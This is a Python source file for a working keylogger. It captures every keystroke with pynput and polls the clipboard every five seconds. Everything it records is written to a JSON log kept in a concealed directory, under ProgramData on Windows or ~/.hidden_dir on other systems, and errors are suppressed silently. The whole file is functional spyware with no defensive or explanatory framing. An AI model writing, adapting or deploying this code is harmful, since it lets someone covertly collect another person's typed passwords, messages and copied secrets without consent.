import os
import json
import pyperclip
from pynput import keyboard
from datetime import datetime, timedelta

# Directory and file setup
def get_hidden_dir():
    if os.name == 'nt':  # Windows
        path = os.path.join(os.environ['ProgramData'], 'hidden_dir')
    else:  # Linux/macOS
        path = os.path.expanduser('~/.hidden_dir')
    if not os.path.exists(path):
        os.makedirs(path)
    return path

json_file_path = os.path.join(get_hidden_dir(), 'keylog.json')

# Initialize JSON log file
if not os.path.exists(json_file_path):
    with open(json_file_path, 'w') as file:
        json.dump([], file)

# Load existing data from JSON file
def load_json_data():
    with open(json_file_path, 'r') as file:
        return json.load(file)

# Save data to JSON file
def save_json_data(data):
    with open(json_file_path, 'w') as file:
        json.dump(data, file, indent=4)

# Variable to track the last timestamp and clipboard content
last_timestamp = datetime.now() - timedelta(minutes=15)  # Set to 15 min before current time
last_clipboard_content = None  # Store last clipboard content

# Function to log keystrokes with timestamp every 15 minutes
def log_keystroke(key):
    global last_timestamp

    current_time = datetime.now()
    key_data = str(key).replace("'", "")
    
    if key == keyboard.Key.space:
        key_data = ' '
    elif key == keyboard.Key.enter:
        key_data = '\n'

    data = load_json_data()

    # Log timestamp if more than 15 minutes have passed since the last one
    if current_time - last_timestamp >= timedelta(minutes=15):
        data.append({
            'timestamp': str(current_time),
            'event': 'Timestamp logged'
        })
        last_timestamp = current_time

    # Log the key press
    data.append({
        'key': key_data
    })
    
    save_json_data(data)

# Function to log clipboard content only when it changes
def log_clipboard():
    global last_clipboard_content

    current_time = datetime.now()
    clipboard_data = pyperclip.paste()

    if clipboard_data != last_clipboard_content and clipboard_data:  # Check if clipboard content has changed
        data = load_json_data()

        # Log clipboard content
        data.append({
            'timestamp': str(current_time),
            'copied': clipboard_data
        })

        save_json_data(data)

        # Update the last clipboard content
        last_clipboard_content = clipboard_data

# Listener for keyboard events
def on_press(key):
    try:
        log_keystroke(key)
    except Exception as e:
        pass

# Run keyboard listener
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Periodically check clipboard content (every 5 seconds)
import time
while True:
    log_clipboard()
    time.sleep(5)  # Check clipboard every 5 seconds
